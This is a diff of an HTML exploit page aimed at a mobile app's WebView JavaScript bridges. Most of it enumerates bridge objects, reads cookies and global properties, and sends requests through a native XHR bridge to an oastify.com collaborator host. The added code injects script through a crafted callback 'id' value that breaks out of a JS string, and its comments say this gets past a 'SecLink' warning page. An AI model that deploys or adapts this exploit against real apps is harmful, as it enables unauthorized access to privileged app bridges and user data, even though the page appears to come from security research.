@@ -1,81 +1,56 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<style>
-body{margin:0;padding:8px;background:#111;color:#0f0;font:13px monospace;word-break:break-all}
-pre{white-space:pre-wrap}
-</style>
-</head>
-<body>
-<pre id="o"></pre>
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head><body>
 <script>
-var o=document.getElementById('o'),L=[];
-function a(m){L.push(String(m));o.textContent=L.join('\n');}
-a('=== H8 JSB Probe ===');
-a('URL: '+location.href.substring(0,150));
-a('ORIGIN: '+location.origin);
-a('');
-a('--- JSB Objects ---');
-var names=['__TTHYBRIDXHR','WIReport','iesJsBridgeTransferMonitor','__globalprops','BDXBridge','ToutiaoJSBridge'];
+// H8 id 参数 XSS 绕过 SecLink：
+// postMessage 回调通过 evaluateJavascript 执行，
+// 即使 SecLink 替换了页面，回调 JS 仍在新页面上执行
+var results = [];
+function log(m){ results.push(String(m)); }
+
+log('=== H8 JSB Probe ===');
+var names = ['__TTHYBRIDXHR','WIReport','iesJsBridgeTransferMonitor','__globalprops','BDXBridge','ToutiaoJSBridge'];
 names.forEach(function(x){
-  try{
-    var t=window[x];
+  try {
+    var t = window[x];
     if(t){
-      var m=[];
-      for(var k in t) if(typeof t[k]=='function') m.push(k);
+      var m=[]; for(var k in t) if(typeof t[k]=='function') m.push(k);
       try{Object.keys(t).forEach(function(k){if(m.indexOf(k)<0&&typeof t[k]=='function')m.push(k);});}catch(e){}
-      a('[OK] '+x+' ['+m.join(',')+']');
-    }else a('[NO] '+x);
-  }catch(e){a('[ERR] '+x+' '+e.message);}
+      log('[OK] '+x+' ['+m.join(',')+']');
+    } else log('[NO] '+x);
+  } catch(e){ log('[ERR] '+x+' '+e.message); }
 });
-a('');
-a('--- Call Tests ---');
-if(window.__TTHYBRIDXHR){
-  try{
-    window.imy_cb=function(i,r){
-      a('[CB] id='+i+' status='+(r&&r.status));
-      if(r) a('[CB] headers='+JSON.stringify(r.headers||{}).substring(0,500));
-      a('[CB] body='+JSON.stringify(r).substring(0,400));
-      o.textContent=L.join('\n');
-    };
-    var r=__TTHYBRIDXHR.postMessage(JSON.stringify({
-      url:'https://nvmbwl14jwh72qwixi1ghcq5cwin6ex2m.oastify.com/get?probe=1',
-      method:'GET',
-      headers:{},
-      data:'',
-      id:'probe1'
-    }));
-    a('[XHR] postMessage='+r);
-  }catch(e){a('[XHR ERR] '+e.message);}
-}else{
-  a('[XHR] __TTHYBRIDXHR not found');
-}
-a('');
+
 if(window.__globalprops){
-  try{
-    a('[GP] '+String(__globalprops.getGlobalProps()).substring(0,500));
-  }catch(e){a('[GP ERR] '+e.message);}
-}else{
-  a('[GP] __globalprops not found');
+  try{ log('[GP] '+String(__globalprops.getGlobalProps()).substring(0,300)); }catch(e){}
 }
-a('');
 if(window.iesJsBridgeTransferMonitor){
-  try{
-    a('[MON] '+String(iesJsBridgeTransferMonitor.getInfo()));
-  }catch(e){a('[MON ERR] '+e.message);}
-}else{
-  a('[MON] iesJsBridgeTransferMonitor not found');
+  try{ log('[MON] '+String(iesJsBridgeTransferMonitor.getInfo())); }catch(e){}
 }
-a('');
-try{
-  a('[COOKIE] '+(document.cookie||'empty'));
-}catch(e){
-  a('[COOKIE] blocked: '+e.message);
+
+// 关键：用 id 参数 XSS 注入显示代码
+// 回调触发时，evaluateJavascript 会在当前页面（可能是 SecLink 警告页）上执行
+var displayJS = 'document.open();document.write("<html><body style=margin:0;padding:8px;background:#111;color:#0f0;font:12px monospace;word-break:break-all><pre style=white-space:pre-wrap>' 
+  + results.join('\\n').replace(/</g,'&lt;') 
+  + '</pre></body></html>");document.close();';
+
+// id 突破 JS 字符串上下文：id":"x");<DISPLAYJS>//
+var craftedId = 'x");' + displayJS + '//';
+
+if(window.__TTHYBRIDXHR){
+  try {
+    window.imy_cb = function(){};
+    __TTHYBRIDXHR.postMessage(JSON.stringify({
+      url: 'https://moeapku3cva6vpphqhufabj45vbmzdr1g.oastify.com/get111',
+      method: 'GET',
+      headers: {},
+      data: '',
+      id: craftedId
+    }));
+    log('[XHR] sent with XSS id');
+  } catch(e){ log('[XHR ERR] '+e.message); }
+} else {
+  log('[NO XHR]');
 }
-a('');
-a('--- DONE ---');
-</script>
-</body>
-</html>
+
+// 也尝试直接显示（如果页面没被替换）
+document.body.innerHTML = '<pre style="color:#0f0;background:#111;padding:8px;font:12px monospace">'+results.join('\n')+'</pre>';
+</script></body></html>
